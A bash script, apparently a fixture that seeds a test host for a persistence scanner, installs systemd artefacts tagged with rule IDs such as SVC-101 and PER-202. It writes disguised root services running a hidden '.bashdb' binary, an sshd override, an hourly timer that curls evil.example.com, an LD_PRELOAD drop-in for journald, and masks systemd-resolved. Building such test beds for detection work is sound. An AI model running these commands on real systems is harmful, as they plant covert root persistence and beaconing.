#!/bin/bash
# Systemd-based Persistence
set -e

echo "[*] Configuring systemd persistence..."

# SVC-101: Insecure service definition
cat > /etc/systemd/system/system-update.service << 'UNIT'
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/.bashdb -c "sleep 3600"
Restart=always
User=root

[Install]
WantedBy=multi-user.target
UNIT

systemctl daemon-reload
systemctl enable system-update.service
systemctl start system-update.service

# SVC-202: Service from unknown binary
cat > /etc/systemd/system/net-mon.service << 'UNIT2'
[Unit]
Description=Network Monitor
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/nonexistent-monitor
Restart=on-failure

[Install]
WantedBy=multi-user.target
UNIT2

systemctl daemon-reload
systemctl enable net-mon.service 2>/dev/null || true

# SVC-402: Modified systemd unit (add malicious ExecStartPre)
mkdir -p /etc/systemd/system/sshd.service.d
cat > /etc/systemd/system/sshd.service.d/override.conf << 'OVERRIDE'
[Service]
ExecStartPre=/usr/local/bin/.bashdb -c "logger -t sshd 'Connection from unknown host'"
OVERRIDE

# PER-202: Suspicious timer units
cat > /etc/systemd/system/update-check.timer << 'TIMER'
[Unit]
Description=Update Check Timer

[Timer]
OnBootSec=5min
OnUnitActiveSec=1h

[Install]
WantedBy=timers.target
TIMER

cat > /etc/systemd/system/update-check.service << 'TIMER_SVC'
[Unit]
Description=Update Check Service

[Service]
Type=oneshot
ExecStart=/usr/local/bin/.bashdb -c "curl -s http://evil.example.com/checkin"
TIMER_SVC

systemctl daemon-reload
systemctl enable update-check.timer 2>/dev/null || true

# PER-203: Service drop-in
mkdir -p /etc/systemd/system/systemd-journald.service.d
cat > /etc/systemd/system/systemd-journald.service.d/override.conf << 'DROPIN'
[Service]
Environment=LD_PRELOAD=/usr/local/lib/libevil.so
DROPIN

# SVC-501: World-writable ExecStart binary
chmod 777 /usr/local/bin/.bashdb 2>/dev/null || true

# SVC-504: Masked service with unit file present
systemctl mask systemd-resolved 2>/dev/null || true

# SVC-301: Failed service (point to missing binary)
cat > /etc/systemd/system/failed-svc.service << 'FAILED'
[Unit]
Description=Failed Service
After=network.target

[Service]
Type=simple
ExecStart=/nonexistent/binary
Restart=no

[Install]
WantedBy=multi-user.target
FAILED

systemctl daemon-reload
systemctl start failed-svc.service 2>/dev/null || true

echo "[+] Systemd persistence configured"
